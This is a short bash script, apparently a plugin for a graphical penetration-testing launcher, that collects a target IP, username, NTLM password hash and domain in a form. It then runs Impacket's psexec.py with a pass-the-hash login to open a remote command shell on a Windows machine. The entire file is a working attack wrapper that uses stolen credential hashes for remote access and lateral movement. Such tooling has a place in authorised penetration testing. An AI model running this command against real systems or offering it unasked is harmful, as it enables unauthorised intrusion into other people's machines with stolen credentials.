#!/bin/bash

: '
Impacket: psexec.py get psexec shell 
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
IP_FIELD=$(form_item "ip" "ip")
HASH_FIELD=$(form_item "hash" "hash")
USERNAME_FIELD=$(form_item "username" "username")
DOMAIN_FIELD=$(form_item "domain" "domain")

# Generate GUI form
generate_form "${IP_FIELD}" "${USERNAME_FIELD}" "${HASH_FIELD}" "${DOMAIN_FIELD}"

HASH=${form_data["hash"]}
DOMAIN=${form_data["domain"]}
USERNAME=${form_data["username"]}
IP=${form_data["ip"]}

execute_command "psexec.py -hashes ':${HASH}' '${DOMAIN}/${USERNAME}@${IP}'"
create_new_line
